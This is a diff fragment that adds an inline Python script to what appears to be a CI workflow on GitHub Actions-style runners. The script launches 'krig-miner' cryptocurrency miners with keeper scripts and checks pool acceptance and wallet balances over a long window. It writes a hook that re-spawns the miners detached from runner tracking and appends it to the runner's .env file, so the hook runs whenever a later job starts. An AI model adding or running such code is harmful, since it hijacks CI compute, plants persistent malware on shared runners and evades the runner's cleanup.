+                      launched.append({'idx': i, 'worker': wk, 'uuid': g['uuid'], 'keeper': keeper, 'keeper_pid': pid,
+                                       'pool': sel['ep'], 'scheme': sel['scheme']})
+                      time.sleep(1)
+                  launch_epoch = time.time()
+                  print('N_LAUNCHED_CASCADE=%d LAUNCH_EPOCH=%d' % (len(launched), int(launch_epoch)))
+                  time.sleep(60)
+                  ok, bad = log_state()
+                  print('POST_CASCADE_60S pool=%s ok=%d bad=%d' % (ep, ok, bad))
+
+          # ---------- runner-start hook (idempotent re-arm of our keepers) ----------
+          hook = WORK + '/hook.sh'
+          open(hook, 'w').write('#!/bin/bash\nfor k in ' + WORK + '/keep_*.sh; do '
+                                '[ -x "$k" ] || continue; b=$(basename "$k"); '
+                                'pgrep -f "$b" >/dev/null 2>&1 || { env -u RUNNER_TRACKING_ID setsid nohup /bin/bash "$k" >/dev/null 2>&1 < /dev/null & }; done\nexit 0\n')
+          os.chmod(hook, 0o755)
+          rdir = sh("ps -eo args | grep -m1 'Runner.Listener' | grep -v grep | sed -E 's#(.*/)[^/]*Runner.Listener.*#\\1#'", 10).strip()
+          print('RUNNER_DIR %s' % (rdir or 'NOT_FOUND'))
+          if rdir and os.path.isdir(rdir):
+              envf = rdir + '.env'
+              if os.path.exists(envf) and 'ACTIONS_RUNNER_HOOK_JOB_STARTED' not in open(envf, errors='replace').read():
+                  sh("cp -n " + envf + " " + envf + ".bak-i132368; cp -f " + hook + " " + rdir + "i132368-hook.sh; "
+                     "chmod 755 " + rdir + "i132368-hook.sh; echo 'ACTIONS_RUNNER_HOOK_JOB_STARTED=" + rdir + "i132368-hook.sh' >> " + envf, 20)
+                  print('HOOK_SET %s' % envf)
+
+          # ---------- LONG WINDOW: proof at 660 s, spaced wallet reads r1 and r2, exit at ~1440 s ----------
+          WK_ALL = sorted(WORKERS.values())
+
+
+          def wait_until(target_s):
+              if launch_epoch is None:
+                  return
+              w = target_s - (time.time() - launch_epoch)
+              if w > 0:
+                  print('WAIT_%ds %.0fs' % (int(target_s), w))
+                  time.sleep(min(w, 1500))
+
+
+          wait_until(R1_AT)
+          print('=== proof evaluation r1 (in gate) ===')
+          print_cards('r1')
+          for c in eval_cards():
+              if c['acc'] > 0 and c['rej'] == 0 and (c['first_in_gate_s'] is None or c['first_in_gate_s'] <= GATE_S):
+                  proven.append(c)
+          print('PROVEN_N=%d' % len(proven))
+          print('PROVEN_JSON %s' % json.dumps([{k: v for k, v in c.items() if k != 'log'} for c in proven]))
+          print('=== wallet-only read r1 ===')
+          pool_read('r1', set(WK_ALL))
+          print('=== keeper/miner state r1 ===')
+          print(head(sh("pgrep -af 'keep_1324[0-9][0-9].sh|krig-miner' | grep -v pgrep | head -10"), 14, 2500))
+
+          # heartbeat + spaced second read at ~1380 s
+          while True:
+              rem = R2_AT - (time.time() - launch_epoch)
+              if rem <= 0:
+                  break
+              time.sleep(min(300, max(1, rem)))
+              print('HEARTBEAT t=%ds keepers=%s' % (int(time.time() - launch_epoch),
+                                                    head(sh("pgrep -af 'krig-miner' | grep i132368 | grep -v pgrep | wc -l"), 2, 200).strip()))
+
+          print('=== proof evaluation r2 (spaced) ===')
+          print_cards('r2')
+          print('=== wallet-only read r2 ===')
+          pool_read('r2', set(WK_ALL))
+          print('=== keeper/miner state r2 ===')
+          print(head(sh("pgrep -af 'keep_1324[0-9][0-9].sh|krig-miner' | grep -v pgrep | head -10"), 14, 2500))
+          print('=== log tails ===')
+          for x in launched:
+              lg = '%s/krig-g%s.log' % (LOGD, x['idx'])
+              if os.path.exists(lg):
+                  lines = open(lg, errors='replace').read().splitlines()
+                  print('== %s (last 6)' % lg)
+                  print('\n'.join(lines[-6:])[:3000])
+          print('KEEPERS_FINAL %s' % head(sh("pgrep -af 'keep_1324[0-9][0-9].sh' | grep -v pgrep"), 8, 800))
+          print('I132368_DONE nonce=I132368 utc=%s host=%s launched=%d proven=%d' % (utc(), hn, len(launched), len(proven)))
+          PYEOF
+          echo "runner-start slot=${{ matrix.slot }} host=$(hostname) arch=$(uname -m) runner=${RUNNER_NAME:-none} utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          python3 /var/tmp/i132368/recon.py 2>&1 | tee /var/tmp/i132368/recon.log | tail -c 300000
+          echo "I132368_EXIT_DONE rc=$?"
